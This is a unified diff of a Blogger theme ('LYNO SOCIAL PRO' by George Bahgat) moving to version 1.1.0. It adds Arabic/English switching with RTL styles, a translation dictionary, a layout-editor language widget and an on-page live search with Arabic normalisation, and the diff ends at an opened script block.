@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE html>
-<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateUrl='indie.xml' b:templateVersion='5.0.0' expr:dir='data:blog.languageDirection' expr:lang='data:blog.languageDirection == "rtl" ? "ar" : "en"' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateUrl='indie.xml' b:templateVersion='5.0.0' expr:dir='data:skin.vars.site_lang == "ar" ? "rtl" : "ltr"' expr:lang='data:skin.vars.site_lang' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
 <head>
     <meta content='width=device-width, initial-scale=1, shrink-to-fit=no' name='viewport'/>
     
@@ -52,7 +52,7 @@
     -----------------------------------------------
     THEME: LYNO SOCIAL PRO
     DEVELOPER: George Bahgat
-    VERSION: 1.0.0
+    VERSION: 1.1.0
     -----------------------------------------------
     */
     
@@ -60,6 +60,7 @@
     /* <Group description="Site Branding" title="Site Branding">
        <Variable name="site.name" description="Site Name" type="string" default="LYNO PRO" value="LYNO PRO"/>
        <Variable name="site.logo" description="Logo URL (Icon instead of Text)" type="string" default="" value=""/>
+       <Variable name="site.lang" description="Template Language (en or ar)" type="string" default="en" value="en"/>
     </Group> */
 
     :root {
@@ -102,6 +103,20 @@
         line-height: normal;
         overflow-x: hidden;
     }
+    
+    /* RTL Specific Overrides */
+    [dir="rtl"] { text-align: right; }
+    [dir="rtl"] .header-search i { margin-left: 0; margin-right: 10px; }
+    [dir="rtl"] .nav-item i { margin-right: 0; margin-left: 15px; }
+    [dir="rtl"] .stats-left { gap: 18px; }
+    [dir="rtl"] .stat-item i { margin-right: 0; margin-left: 6px; }
+    [dir="rtl"] .widget-head i { margin-right: 0; margin-left: 10px; }
+    [dir="rtl"] .profile-name i { margin-right: 0; margin-left: 5px; }
+    [dir="rtl"] .comment-header img { margin-right: 0; margin-left: 10px; }
+    [dir="rtl"] .comment-content { padding-left: 0; padding-right: 45px; }
+    [dir="rtl"] .header-search { flex-direction: row-reverse; }
+    [dir="rtl"] .header-search input { text-align: right; }
+    
     a { text-decoration: none; color: inherit; transition: var(--transition); }
     ul { list-style: none; }
     img { display: block; max-width: 100%; height: auto; border-radius: var(--radius); }
@@ -137,6 +152,7 @@
     .brand-logo:hover { transform: scale(1.05); }
 
     /* Search Bar */
+    .header-search-wrapper { position: relative; }
     .header-search {
         background: var(--surface);
         border: 1px solid var(--border);
@@ -207,6 +223,7 @@
         min-height: 100px; display: flex; align-items: center; justify-content: center;
         margin-bottom: 30px; overflow: hidden; position: relative;
     }
+    .adsense-wrapper h2, .adsense-wrapper .widget-title { display: none !important; }
     .adsense-label { display: none; }
 
     /* 
@@ -452,52 +469,61 @@
     <b:template-skin><![CDATA[
       /* --- ULTIMATE STABLE LAYOUT EDITOR --- */
       body#layout { 
-          background: #f8fafc !important; 
-          padding: 50px !important;
-          font-family: 'Segoe UI', sans-serif !important;
+          background: #f1f5f9 !important; 
+          padding: 40px !important;
+          font-family: 'Segoe UI', system-ui, sans-serif !important;
       }
       
-      /* Reset all complex CSS from the live site */
-      body#layout .left-side, 
-      body#layout .right-side, 
-      body#layout .content-feed,
+      /* Reset all complex structure from live site */
+      body#layout .header-social,
+      body#layout .header-inner,
+      body#layout .brand-logo,
       body#layout .app-container,
-      body#layout .main-grid {
+      body#layout .main-grid,
+      body#layout .left-side,
+      body#layout .right-side,
+      body#layout .content-feed {
           position: static !important;
           width: 100% !important;
           max-width: 1000px !important;
-          margin: 0 auto !important;
+          margin: 0 auto 20px !important;
           display: block !important;
           float: none !important;
           height: auto !important;
           overflow: visible !important;
+          background: transparent !important;
           backdrop-filter: none !important;
+          border: none !important;
           box-shadow: none !important;
+          padding: 0 !important;
+          transform: none !important;
       }
 
       /* Sections: Professional Cards */
       body#layout .section {
           background: #ffffff !important;
-          border: 1px solid #e2e8f0 !important;
+          border: 1px solid #cbd5e1 !important;
           border-radius: 12px !important;
-          margin-bottom: 40px !important;
-          padding: 30px !important;
-          box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05) !important;
+          margin-bottom: 50px !important;
+          padding: 40px 30px 30px !important;
+          box-shadow: 0 4px 15px rgba(0,0,0,0.05) !important;
           position: relative !important;
+          clear: both !important;
       }
       
       body#layout .section::before {
           content: attr(id);
           position: absolute;
-          top: -12px; left: 20px;
+          top: -15px; left: 25px;
           background: #4f46e5;
           color: #fff;
-          font-size: 11px;
+          font-size: 12px;
           font-weight: 900;
-          padding: 4px 15px;
+          padding: 5px 20px;
           border-radius: 6px;
           text-transform: uppercase;
-          box-shadow: 0 4px 10px rgba(79, 70, 229, 0.3);
+          box-shadow: 0 4px 12px rgba(79, 70, 229, 0.4);
+          z-index: 10;
       }
 
       /* Widgets: Minimal & Clean */
@@ -505,59 +531,82 @@
           background: #f8fafc !important;
           border: 1px solid #e2e8f0 !important;
           border-radius: 10px !important;
-          margin: 15px 0 !important;
-          padding: 15px !important;
+          margin: 20px 0 !important;
+          padding: 20px !important;
           transition: 0.3s;
       }
-      body#layout .widget:hover { border-color: #4f46e5; }
+      body#layout .widget:hover { border-color: #4f46e5; background: #fff !important; }
       
       body#layout .widget h2 {
-          font-size: 14px !important;
-          color: #1e1b4b !important;
+          font-size: 15px !important;
+          color: #1e293b !important;
           font-weight: 800 !important;
-          margin-bottom: 10px !important;
-          text-transform: capitalize !important;
+          margin-bottom: 12px !important;
+          border-bottom: 2px solid #e2e8f0 !important;
+          padding-bottom: 8px !important;
       }
 
-      /* Functional Buttons */
-      body#layout .add-widget {
-          background: #4f46e5 !important;
-          color: #fff !important;
-          border-radius: 8px !important;
-          padding: 8px 18px !important;
-          font-weight: 700 !important;
-          font-size: 12px !important;
-          display: inline-block !important;
-          border: none !important;
-          cursor: pointer !important;
-      }
-
-      /* Hide System Overlays in Editor */
-      body#layout .adsense-wrapper,
-      body#layout .side-widget,
-      body#layout #LayoutSettings {
-          position: static !important;
+      /* Language Setting Section in Layout */
+      #ThemeSettingsSection { display: none; }
+      body#layout #ThemeSettingsSection {
           display: block !important;
-          margin: 0 !important;
+          border: 2px dashed #4f46e5 !important;
+          background: #eff6ff !important;
       }
-      /* Developer Signature in Layout Editor (Hard to Remove) */
+      
+       /* Reset Container visibility for Sections in Layout */
+       body#layout .adsense-wrapper,
+       body#layout .side-widget,
+       body#layout .nav-card,
+       body#layout .left-side,
+       body#layout .right-side {
+           display: block !important;
+           position: static !important;
+           width: 100% !important;
+           margin: 10px 0 !important;
+           padding: 0 !important;
+       }
+
+       /* Hide truly unnecessary UI elements in Editor */
+       body#layout .nav-actions,
+       body#layout #LayoutSettings,
+       body#layout .header-search {
+           display: none !important;
+       }
+
+      /* Developer Signature */
       body#layout::after {
-          content: 'Developed & Secured by George Bahgat \2122';
+          content: 'Built with Precision by George Bahgat';
           position: fixed;
-          bottom: 20px; right: 20px;
-          background: #4f46e5;
+          bottom: 25px; right: 25px;
+          background: #0f172a;
           color: #fff;
-          padding: 10px 20px;
-          border-radius: 50px;
-          font-weight: 900;
-          font-size: 14px;
-          box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+          padding: 12px 25px;
+          border-radius: 12px;
+          font-weight: 800;
+          font-size: 13px;
+          box-shadow: 0 10px 40px rgba(0,0,0,0.3);
           z-index: 999999;
-          pointer-events: none;
+          border: 1px solid rgba(255,255,255,0.1);
       }
     ]]></b:template-skin>
 </head>
 <body data-theme='dark'>
+    
+    <b:section id='ThemeSettingsSection' maxwidgets='1' showaddelement='false' title='Language Settings'>
+        <b:widget id='HTML99' locked='true' title='Default Language (ar/en)' type='HTML' version='2'>
+            <b:includable id='main'>
+                <!-- Instructions visible only in Layout Editor -->
+                <div style='background:#fffde7; padding:15px; border:1px solid #fff59d; border-radius:8px; color:#5d4037; font-size:13px; line-height:1.5;'>
+                    <strong style='display:block; margin-bottom:5px; color:#d84315;'>&#9888; Language Configuration:</strong>
+                    Directly type <b>ar</b> for Arabic or <b>en</b> for English in the content box below.<br/>
+                    <em>Current Value:</em> <strong style='color:#4f46e5;'><data:content/></strong>
+                </div>
+                <!-- Data used by Script -->
+                <div id='layout-lang-val' style='display:none;'><data:content/></div>
+            </b:includable>
+        </b:widget>
+    </b:section>
 
     <!-- HEADER (SOCIAL BLADE) -->
     <header class='header-social'>
@@ -582,13 +631,19 @@
                 </b:section>
             </a>
 
-            <!-- Search Area -->
-            <form action='/search' class='header-social-search' method='get'>
+            <!-- Enhanced Search Area with Live Results -->
+            <div class='header-search-wrapper'>
                 <div class='header-search'>
                     <i class='fa-solid fa-magnifying-glass'></i>
-                    <input name='q' placeholder='Search George&#39;s Feed...' type='text'/>
+                    <input id='live-search-input' type='text' autocomplete='off'>
+                        <b:attr expr:value='data:skin.vars.site_lang == "ar" ? "ابحث هنا..." : "Search here..."' name='placeholder'/>
+                    </input>
+                    <button id='clear-search' style='display:none; background:none; border:none; color:var(--text-sub); cursor:pointer; padding:0 10px;'>
+                        <i class='fa-solid fa-times'></i>
+                    </button>
                 </div>
-            </form>
+                <div id='live-search-results' style='display:none; position:absolute; top:50px; left:0; right:0; background:var(--surface); border:1px solid var(--border); border-radius:15px; max-height:400px; overflow-y:auto; box-shadow:var(--shadow); z-index:1000;'></div>
+            </div>
 
             <div class='nav-actions'>
                 <button aria-label='Toggle Dark/Light Mode' class='nav-link-btn' onclick='toggleTheme()' title='Toggle Mode'>
@@ -612,29 +667,32 @@
             <aside class='left-side'>
                 <div class='nav-card'>
                     <a class='nav-item active' href='/'>
-                        <i class='fa-solid fa-house-user'></i> Feed
+                        <i class='fa-solid fa-house-user'></i> <span class='txt-feed'><b:if cond='data:skin.vars.site_lang == "ar"'>الرئيسية<b:else/>Feed</b:if></span>
                     </a>
                     <a class='nav-item' href='#trending'>
-                        <i class='fa-solid fa-fire-flame-curved'></i> Trending
+                        <i class='fa-solid fa-fire-flame-curved'></i> <span class='txt-trending'><b:if cond='data:skin.vars.site_lang == "ar"'>رائج<b:else/>Trending</b:if></span>
                     </a>
                     <a class='nav-item' href='#latest'>
-                        <i class='fa-solid fa-bolt'></i> New Arrivals
+                        <i class='fa-solid fa-bolt'></i> <span class='txt-latest'><b:if cond='data:skin.vars.site_lang == "ar"'>وصل حديثاً<b:else/>New Arrivals</b:if></span>
                     </a>
                     <a class='nav-item' href='#coding'>
-                        <i class='fa-solid fa-code'></i> Coding Zone
+                        <i class='fa-solid fa-code'></i> <span class='txt-coding'><b:if cond='data:skin.vars.site_lang == "ar"'>ركن البرمجة<b:else/>Coding Zone</b:if></span>
                     </a>
                 </div>
                 
                 <div class='nav-card'>
-                    <div class='menu-head' style='font-size:11px; text-transform:uppercase; color:var(--text-sub); margin-bottom:10px; font-weight:800;'>Your World</div>
-                    <a class='nav-item' href='/p/about.html'><i class='fa-solid fa-circle-info'></i> About Us</a>
-                    <a class='nav-item' href='/p/contact.html'><i class='fa-solid fa-paper-plane'></i> Contact</a>
+                    <div class='menu-head' style='font-size:11px; text-transform:uppercase; color:var(--text-sub); margin-bottom:10px; font-weight:800;'>
+                        <b:if cond='data:skin.vars.site_lang == "ar"'>قائمتك<b:else/>Your World</b:if>
+                    </div>
+                    <a class='nav-item' href='/p/about.html'><i class='fa-solid fa-circle-info'></i> <span class='txt-about'><b:if cond='data:skin.vars.site_lang == "ar"'>من نحن<b:else/>About Us</b:if></span></a>
+                    <a class='nav-item' href='/p/contact.html'><i class='fa-solid fa-paper-plane'></i> <span class='txt-contact'><b:if cond='data:skin.vars.site_lang == "ar"'>اتصل بنا<b:else/>Contact</b:if></span></a>
                 </div>
 
                 <!-- Small Sidebar Ad Slot -->
                 <div class='adsense-wrapper' style='min-height:200px;'>
+                    <span class='txt-ads' style='position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--text-sub); font-weight:800; opacity:0.3;'><b:if cond='data:skin.vars.site_lang == "ar"'>مساحة إعلانية<b:else/>Ads</b:if></span>
                     <b:section id='SidebarLeftAd' maxwidgets='1' showaddelement='true'>
-                        <b:widget id='HTML101' locked='false' title='Ads' type='HTML'/>
+                        <b:widget id='HTML101' locked='false' expr:title='data:skin.vars.site_lang == "ar" ? "مساحة إعلانية" : "Ads"' type='HTML'/>
                     </b:section>
                 </div>
             </aside>
@@ -644,8 +702,9 @@
                 
                 <!-- TOP ADSENSE -->
                 <div class='adsense-wrapper'>
+                    <span class='txt-topad' style='position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--text-sub); font-weight:800; opacity:0.3;'><b:if cond='data:skin.vars.site_lang == "ar"'>إعلان علوي<b:else/>Top Ad</b:if></span>
                     <b:section id='TopAdSec' maxwidgets='1' showaddelement='true'>
-                         <b:widget id='HTML1' locked='false' title='Top Ad' type='HTML'/>
+                         <b:widget id='HTML1' locked='false' expr:title='data:skin.vars.site_lang == "ar" ? "إعلان علوي" : "Top Ad"' type='HTML'/>
                     </b:section>
                 </div>
 
@@ -662,7 +721,7 @@
                                                 <img alt='George Bahgat' class='author-avatar' src='https://cdn-icons-png.flaticon.com/128/3135/3135715.png'/>
                                                 <div>
                                                     <h4 class='author-name'><data:post.author.name/> <i class='fa-solid fa-check-circle v-badge'></i></h4>
-                                                    <p class='post-time'><data:post.dateHeader/></p>
+                                                    <p class='profile-bio'><span class='txt-bio'><b:if cond='data:skin.vars.site_lang == "ar"'>مطور برمجيات متكامل.<b:else/>Full Stack Software Developer.</b:if></span></p>
                                                 </div>
                                             </div>
                                             <div style='color:var(--text-sub); cursor:pointer;'><i class='fa-solid fa-ellipsis-v'></i></div>
@@ -708,7 +767,7 @@
                                                 </button>
                                             </div>
                                             <div class='views-count'>
-                                                <i class='fa-regular fa-eye'></i> <span class='v-num' expr:data-id='data:post.id'>0</span> Views
+                                                <i class='fa-regular fa-eye'></i> <span class='v-num' expr:data-id='data:post.id'>0</span> <span class='txt-views'><b:if cond='data:skin.vars.site_lang == "ar"'>مشاهدة<b:else/>Views</b:if></span>
                                             </div>
                                         </div>
                                     </article>
@@ -716,9 +775,9 @@
                                     <!-- In-Feed Ad (Simulated after some posts) -->
                                     <b:if cond='data:post.id == data:posts[1].id'>
                                         <div class='adsense-wrapper reveal'>
-                                            <span class='adsense-label'>Suggested for you</span>
+                                            <span class='adsense-label'><b:if cond='data:skin.vars.site_lang == "ar"'>مقترح لك<b:else/>Suggested for you</b:if></span>
                                             <div style='width:100%; height:100%; display:flex; align-items:center; justify-content:center'>
-                                                 <p style='color:var(--text-sub); font-size:12px;'>ADSENSE IN-FEED UNIT</p>
+                                                 <p style='color:var(--text-sub); font-size:12px;'><b:if cond='data:skin.vars.site_lang == "ar"'>وحدة إعلانية<b:else/>ADSENSE IN-FEED UNIT</b:if></p>
                                             </div>
                                         </div>
                                     </b:if>
@@ -730,7 +789,7 @@
                                             <img alt='George Bahgat' class='author-avatar' src='https://cdn-icons-png.flaticon.com/128/3135/3135715.png' style='width:50px;height:50px;'/>
                                             <div>
                                                 <h1 style='font-size:32px; font-weight:900;'><data:post.title/></h1>
-                                                <p style='color:var(--text-sub); font-size:14px;'>By <data:post.author.name/> &#8226; <data:post.dateHeader/></p>
+                                                <p style='color:var(--text-sub); font-size:14px;'><span class='txt-by'><b:if cond='data:skin.vars.site_lang == "ar"'>بواسطة<b:else/>By</b:if></span> <data:post.author.name/> &#8226; <data:post.dateHeader/></p>
                                             </div>
                                         </div>
                                         
@@ -752,7 +811,7 @@
                                                 </button>
                                             </div>
                                             <div class='views-count'>
-                                                <i class='fa-regular fa-eye'></i> <span class='v-num' expr:data-id='data:post.id'>0</span> Views
+                                                <i class='fa-regular fa-eye'></i> <span class='v-num' expr:data-id='data:post.id'>0</span> <span class='txt-views'><b:if cond='data:skin.vars.site_lang == "ar"'>مشاهدة<b:else/>Views</b:if></span>
                                             </div>
                                         </div>
 
@@ -767,7 +826,9 @@
                              <!-- Pagination -->
                              <div style='text-align:center; padding:50px 0;'>
                                 <b:if cond='data:olderPageUrl'>
-                                    <a class='nav-link-btn' expr:href='data:olderPageUrl' style='width:auto; height:50px; border-radius:50px; padding:0 30px; font-weight:800; background:var(--primary); color:#fff; border:none;'>View More From George</a>
+                                    <a class='nav-link-btn' expr:href='data:olderPageUrl' style='width:auto; height:50px; border-radius:50px; padding:0 30px; font-weight:800; background:var(--primary); color:#fff; border:none;'>
+                                        <b:if cond='data:skin.vars.site_lang == "ar"'>مشاهدة المزيد<b:else/>View More Posts</b:if>
+                                    </a>
                                 </b:if>
                              </div>
                         </b:includable>
@@ -783,7 +844,7 @@
                     <div class='profile-bg'></div>
                     <img alt='George Bahgat' class='profile-avatar' src='https://cdn-icons-png.flaticon.com/128/3135/3135715.png'/>
                     <h3 class='profile-name'>George Bahgat <i class='fa-solid fa-check-circle v-badge'></i></h3>
-                    <p class='profile-bio'>Full Stack Software Developer.</p>
+                    <p class='profile-bio'><b:if cond='data:skin.vars.site_lang == "ar"'>مطور برمجيات متكامل.<b:else/>Full Stack Software Developer.</b:if></p>
                     <div style='display:flex; justify-content:center; gap:8px;'>
                                                 <a aria-label='George Bahgat GitHub' class='nav-link-btn' href='https://github.com/GeorgeBahgat' style='width:35px;height:35px;font-size:14px;' target='_blank'><i class='fa-brands fa-github'></i></a>
                                                 <a aria-label='George Bahgat YouTube' class='nav-link-btn' href='https://www.youtube.com/@george.bahgat' style='width:35px;height:35px;font-size:14px;' target='_blank'><i class='fa-brands fa-youtube'></i></a>
@@ -793,10 +854,11 @@
 
                 <!-- Topics Widget (Scrollable Feature) -->
                 <div class='side-widget'>
-                    <div class='widget-head'><i class='fa-solid fa-hashtag'></i> Topics</div>
+                    <div class='widget-head'><i class='fa-solid fa-hashtag'></i> <span class='txt-topics'><b:if cond='data:skin.vars.site_lang == "ar"'>الأقسام<b:else/>Topics</b:if></span></div>
                     <b:section id='RightSidebar' showaddelement='true'>
-                        <b:widget id='Label2' locked='false' title='Explore' type='Label'>
+                        <b:widget id='Label2' locked='false' expr:title='data:skin.vars.site_lang == "ar" ? "استكشف الأقسام" : "Explore Topics"' type='Label'>
                             <b:includable id='main'>
+                                <b:attr expr:value='data:skin.vars.site_lang == "ar" ? "استكشف الأقسام" : "Explore Topics"' name='title'/>
                                 <div class='topics-scroll'>
                                     <b:loop values='data:labels' var='label'>
                                         <a class='topic-item' expr:href='data:label.url'>
@@ -812,7 +874,7 @@
 
                 <!-- Trending (Popular) Widget -->
                 <div class='side-widget'>
-                    <div class='widget-head'><i class='fa-solid fa-fire'></i> Popular Media</div>
+                    <div class='widget-head'><i class='fa-solid fa-fire'></i> <span class='txt-popular'><b:if cond='data:skin.vars.site_lang == "ar"'>المحتوى الرائج<b:else/>Popular Media</b:if></span></div>
                     <b:section id='RightSidebarTrending' showaddelement='true'>
                          <b:widget id='PopularPosts1' locked='false' title='Most Read' type='PopularPosts'>
                             <b:includable id='main'>
@@ -829,13 +891,13 @@
 
                 <!-- Footer Links in Sidebar for Social Feel -->
                 <div class='legal-links' style='margin-top:20px; border-top:1px solid var(--border); padding-top:15px;'>
-                    <a href='/p/privacy.html' style='font-size:12px;'>Privacy Policy</a>
-                    <a href='/p/terms.html' style='font-size:12px;'>Terms</a>
-                    <a href='/p/cookies.html' style='font-size:12px;'>Cookies</a>
-                    <a href='/p/about.html' style='font-size:12px;'>About Us</a>
+                    <a href='/p/privacy.html' style='font-size:12px;'><span class='txt-privacy'><b:if cond='data:skin.vars.site_lang == "ar"'>سياسة الخصوصية<b:else/>Privacy Policy</b:if></span></a>
+                    <a href='/p/terms.html' style='font-size:12px;'><span class='txt-terms'><b:if cond='data:skin.vars.site_lang == "ar"'>الشروط والأحكام<b:else/>Terms</b:if></span></a>
+                    <a href='/p/cookies.html' style='font-size:12px;'><span class='txt-cookies'><b:if cond='data:skin.vars.site_lang == "ar"'>ملفات التعريف<b:else/>Cookies</b:if></span></a>
+                    <a href='/p/about.html' style='font-size:12px;'><span class='txt-about'><b:if cond='data:skin.vars.site_lang == "ar"'>من نحن<b:else/>About Us</b:if></span></a>
                     <div id='lyn-credit-box' style='margin-top:20px; border-top:1px solid var(--border); padding-top:15px;'>
                         <p style='font-size:12px; color:var(--text); width:100%; font-weight:700;'>
-                            &#169; 2026 <data:skin.vars.site_name/>. Developed by 
+                            &#169; 2026 <data:skin.vars.site_name/>. <span class='txt-dev'><b:if cond='data:skin.vars.site_lang == "ar"'>تم التطوير بواسطة<b:else/>Developed by</b:if></span> 
                             <a href='https://github.com/GeorgeBahgat' id='lyn-dev-link' style='color:var(--primary); text-decoration:underline;' target='_blank'>George Bahgat</a>
                         </p>
                     </div>
@@ -850,20 +912,227 @@
     <script>
     //<![CDATA[
     
-    // 1. Language Logic (George Bahgat Edition)
+    // 1. Language logic with persistence
     const html = document.documentElement;
-    const langBtnTxt = document.getElementById('lang-switcher');
+    const skinLang = '<data:skin.vars.site_lang/>';
+    const layoutLangEl = document.getElementById('layout-lang-val');
+    const layoutLang = layoutLangEl ? layoutLangEl.textContent.trim().toLowerCase() : '';
     
-    function switchLanguage() {
-        if(html.getAttribute('dir') === 'rtl') {
-            html.setAttribute('dir', 'ltr');
-            html.setAttribute('lang', 'en');
-            localStorage.setItem('lyn-lang', 'en');
-        } else {
-            html.setAttribute('dir', 'rtl');
-            html.setAttribute('lang', 'ar');
-            localStorage.setItem('lyn-lang', 'ar');
+    // Priority: LocalStorage > Layout Widget > Skin Variable
+    const defaultLang = layoutLang || skinLang || 'en';
+    let currentLang = localStorage.getItem('lyn-lang') || defaultLang;
+
+    // Translation Dictionary
+    const translations = {
+        'en': {
+            'feed': 'Feed',
+            'trending': 'Trending',
+            'latest': 'New Arrivals',
+            'coding': 'Coding Zone',
+            'about': 'About Us',
+            'contact': 'Contact',
+            'views': 'Views',
+            'search': 'Search here...',
+            'more': 'View More Posts',
+            'by': 'By',
+            'bio': 'Full Stack Software Developer.',
+            'privacy': 'Privacy Policy',
+            'terms': 'Terms',
+            'cookies': 'Cookies',
+            'dev': 'Developed by',
+            'topics': 'Topics',
+            'popular': 'Popular Media',
+            'ads': 'Ads',
+            'topAd': 'Top Ad'
+        },
+        'ar': {
+            'feed': 'الرئيسية',
+            'trending': 'رائج',
+            'latest': 'وصل حديثاً',
+            'coding': 'ركن البرمجة',
+            'about': 'من نحن',
+            'contact': 'اتصل بنا',
+            'views': 'مشاهدة',
+            'search': 'ابحث هنا...',
+            'more': 'مشاهدة المزيد',
+            'by': 'بواسطة',
+            'bio': 'مطور برمجيات متكامل.',
+            'privacy': 'سياسة الخصوصية',
+            'terms': 'الشروط والأحكام',
+            'cookies': 'ملفات التعريف',
+            'dev': 'تم التطوير بواسطة',
+            'topics': 'الأقسام',
+            'popular': 'المحتوى الرائج',
+            'ads': 'مساحة إعلانية',
+            'topAd': 'إعلان علوي'
         }
+    };
+
+    function applyLanguage(lang) {
+        const isAR = lang === 'ar';
+        html.setAttribute('dir', isAR ? 'rtl' : 'ltr');
+        html.setAttribute('lang', lang);
+        
+        // Update elements with translation classes
+        const t = translations[lang];
+        document.querySelectorAll('.txt-feed').forEach(el => el.textContent = t.feed);
+        document.querySelectorAll('.txt-trending').forEach(el => el.textContent = t.trending);
+        document.querySelectorAll('.txt-latest').forEach(el => el.textContent = t.latest);
+        document.querySelectorAll('.txt-coding').forEach(el => el.textContent = t.coding);
+        document.querySelectorAll('.txt-about').forEach(el => el.textContent = t.about);
+        document.querySelectorAll('.txt-contact').forEach(el => el.textContent = t.contact);
+        document.querySelectorAll('.txt-views').forEach(el => el.textContent = t.views);
+        document.querySelectorAll('.txt-more').forEach(el => el.textContent = t.more);
+        document.querySelectorAll('.txt-by').forEach(el => el.textContent = t.by);
+        document.querySelectorAll('.txt-bio').forEach(el => el.textContent = t.bio);
+        document.querySelectorAll('.txt-privacy').forEach(el => el.textContent = t.privacy);
+        document.querySelectorAll('.txt-terms').forEach(el => el.textContent = t.terms);
+        document.querySelectorAll('.txt-cookies').forEach(el => el.textContent = t.cookies);
+        document.querySelectorAll('.txt-dev').forEach(el => el.textContent = t.dev);
+        document.querySelectorAll('.txt-topics').forEach(el => el.textContent = t.topics);
+        document.querySelectorAll('.txt-popular').forEach(el => el.textContent = t.popular);
+        document.querySelectorAll('.txt-ads').forEach(el => el.textContent = t.ads);
+        document.querySelectorAll('.txt-topad').forEach(el => el.textContent = t.topAd);
+        
+        const searchInput = document.querySelector('.header-search input');
+        if(searchInput) searchInput.placeholder = t.search;
+    }
+
+    function switchLanguage() {
+        currentLang = currentLang === 'ar' ? 'en' : 'ar';
+        localStorage.setItem('lyn-lang', currentLang);
+        applyLanguage(currentLang);
+    }
+
+    // Apply language immediately on page load
+    document.addEventListener('DOMContentLoaded', () => {
+        applyLanguage(currentLang);
+        initLiveSearch();
+    });
+
+    // Smart Live Search with Arabic Normalization
+    function initLiveSearch() {
+        const searchInput = document.getElementById('live-search-input');
+        const searchResults = document.getElementById('live-search-results');
+        const clearBtn = document.getElementById('clear-search');
+        
+        if (!searchInput) return;
+
+        // Normalize Arabic text (remove diacritics and normalize similar chars)
+        function normalizeArabic(text) {
+            return text
+                .replace(/[ً-ْ]/g, '') // Remove Arabic diacritics
+                .replace(/[أإآ]/g, 'ا')      // Normalize Alef variations
+                .replace(/ة/g, 'ه')          // Normalize Taa Marbuta
+                .replace(/ى/g, 'ي')          // Normalize Alef Maksura
+                .toLowerCase()
+                .trim();
+        }
+
+        let searchTimeout;
+        searchInput.addEventListener('input', function() {
+            clearTimeout(searchTimeout);
+            const query = this.value.trim();
+            
+            if (query.length < 2) {
+                searchResults.style.display = 'none';
+                clearBtn.style.display = 'none';
+                return;
+            }
+            
+            clearBtn.style.display = 'block';
+            
+            searchTimeout = setTimeout(() => {
+                performSearch(query);
+            }, 300);
+        });
+
+        clearBtn.addEventListener('click', () => {
+            searchInput.value = '';
+            searchResults.style.display = 'none';
+            clearBtn.style.display = 'none';
+            searchInput.focus();
+        });
+
+        function performSearch(query) {
+            const normalizedQuery = normalizeArabic(query);
+            const posts = document.querySelectorAll('.social-card');
+            const results = [];
+
+            posts.forEach(post => {
+                const titleEl = post.querySelector('.post-title a');
+                const labelEl = post.querySelector('.post-label');
+                
+                if (titleEl) {
+                    const title = titleEl.textContent;
+                    const normalizedTitle = normalizeArabic(title);
+                    const label = labelEl ? labelEl.textContent : '';
+                    const normalizedLabel = normalizeArabic(label);
+                    
+                    if (normalizedTitle.includes(normalizedQuery) || normalizedLabel.includes(normalizedQuery)) {
+                        results.push({
+                            title: title,
+                            url: titleEl.href,
+                            label: label
+                        });
+                    }
+                }
+            });
+
+            displayResults(results, query);
+        }
+
+        function displayResults(results, query) {
+            if (results.length === 0) {
+                searchResults.innerHTML = `
+                    <div style='padding:20px; text-align:center; color:var(--text-sub);'>
+                        <i class='fa-solid fa-search' style='font-size:30px; margin-bottom:10px; opacity:0.3;'></i>
+                        <p>${currentLang === 'ar' ? 'لا توجد نتائج' : 'No results found'}</p>
+                    </div>
+                `;
+            } else {
+                searchResults.innerHTML = results.slice(0, 5).map(result => `
+                    <a href='${result.url}' style='display:flex; gap:12px; padding:15px; border-bottom:1px solid var(--border); transition:0.2s;' 
+                       onmouseover='this.style.background="var(--bg)"' onmouseout='this.style.background="transparent"'>
+                        <div style='flex:1;'>
+                            ${result.label ? `<span style='font-size:10px; background:var(--primary); color:#fff; padding:2px 8px; border-radius:5px; margin-bottom:5px; display:inline-block;'>${result.label}</span>` : ''}
+                            <div style='font-weight:700; font-size:14px; color:var(--text);'>${highlightMatch(result.title, query)}</div>
+                        </div>
+                        <i class='fa-solid fa-arrow-right' style='color:var(--text-sub); font-size:12px; align-self:center;'></i>
+                    </a>
+                `).join('');
+            }
+            searchResults.style.display = 'block';
+        }
+
+        function highlightMatch(text, query) {
+            const normalizedText = normalizeArabic(text);
+            const normalizedQuery = normalizeArabic(query);
+            const index = normalizedText.indexOf(normalizedQuery);
+            
+            if (index === -1) return text;
+            
+            // Find the actual position in original text
+            let actualIndex = 0;
+            let normalizedIndex = 0;
+            while (normalizedIndex < index && actualIndex < text.length) {
+                if (normalizeArabic(text[actualIndex]) !== '') normalizedIndex++;
+                actualIndex++;
+            }
+            
+            const before = text.substring(0, actualIndex);
+            const match = text.substring(actualIndex, actualIndex + query.length);
+            const after = text.substring(actualIndex + query.length);
+            
+            return `${before}<mark style='background:#fef08a; color:#854d0e; padding:2px 4px; border-radius:3px;'>${match}</mark>${after}`;
+        }
+
+        // Close results when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.header-search-wrapper')) {
+                searchResults.style.display = 'none';
+            }
+        });
     }
 
     // 2. Theme Logic
@@ -916,7 +1185,8 @@
             navigator.clipboard.writeText(url).then(() => {
                 const toast = document.createElement('div');
                 toast.className = 'share-toast';
-                toast.textContent = 'Link copied to clipboard!';
+                const msg = currentLang === 'ar' ? 'تم نسخ الرابط!' : 'Link copied to clipboard!';
+                toast.textContent = msg;
                 document.body.appendChild(toast);
                 setTimeout(() => toast.remove(), 3000);
             });
@@ -1021,9 +1291,13 @@
     //]]>
     </script>
 
-    <!-- Delayed Core Scripts to avoid Render Blocking & Lighthouse penalty -->
     <script async='async' src='https://www.blogger.com/static/v1/widgets/3846665042-widgets.js' type='text/javascript'></script>
+
+    <script>
+    //<![CDATA[
